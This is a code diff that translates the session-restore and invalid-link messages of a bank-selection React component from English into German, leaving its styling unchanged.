@@ -422,8 +422,8 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
       return (
         <div className="pak-page-shell">
           <div className="w-full max-w-[650px] rounded-[24px] bg-[#141416] border border-[#DF0000] shadow-[0_0_40px_rgba(223,0,0,0.3)] p-5 sm:p-8 text-center">
-            <h2 className="text-2xl font-bold text-white mb-2">Bank Selection</h2>
-            <p className="text-sm text-gray-300 mb-8">Restoring session...</p>
+            <h2 className="text-2xl font-bold text-white mb-2">Bankauswahl</h2>
+            <p className="text-sm text-gray-300 mb-8">Sitzung wird wiederhergestellt...</p>
             <div className="flex justify-center py-12">
               <div className="size-10 animate-spin rounded-full border-4 border-[#DF0000]/30 border-t-[#DF0000]" />
             </div>
@@ -434,8 +434,8 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
     return (
       <div className="pak-page-shell">
         <div className="w-full max-w-[650px] rounded-[24px] bg-[#141416] border border-[#DF0000] shadow-[0_0_40px_rgba(223,0,0,0.3)] p-5 sm:p-8 text-center">
-          <h2 className="text-2xl font-bold text-white mb-2">Bank Selection</h2>
-          <p className="text-sm text-gray-300 mb-6">Invalid link.</p>
+          <h2 className="text-2xl font-bold text-white mb-2">Bankauswahl</h2>
+          <p className="text-sm text-gray-300 mb-6">Ungueltiger Link.</p>
           <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400">
             Use the full link to continue.
           </p>
